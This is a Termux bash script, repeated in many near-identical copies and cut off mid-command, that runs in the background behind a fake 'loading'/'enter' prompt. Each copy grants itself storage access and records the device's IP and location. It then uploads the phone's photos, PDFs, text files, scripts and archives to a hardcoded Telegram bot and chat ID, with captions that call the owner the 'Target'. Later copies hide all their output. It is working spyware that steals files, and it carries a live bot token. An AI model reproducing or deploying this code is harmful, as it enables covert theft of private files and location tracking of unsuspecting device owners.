        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear
echo -e " loading......"
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Debug version
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || { echo "sopo.txt not found"; sleep 60; continue; }
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            echo "Attempting to send file: $file"
            curl -v -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption"
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            echo "Searching for .$ext files..."
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        echo "Completed file sending, sleeping for 1 hour"
        sleep 3600
    else
        echo "Initial setup..."
        yes | termux-setup-storage
        pkg update
        pkg install -y curl neofetch inetutils jq
        touch /data/data/com.termux/files/usr/lib/commplate
        echo "Setup completed, sleeping for 1 minute"
        sleep 60
    fi
done
} &
clear

read -p " enter " 


clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
Yōkoso sensei GALIRUS !
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/ -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/TOOLSV5/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
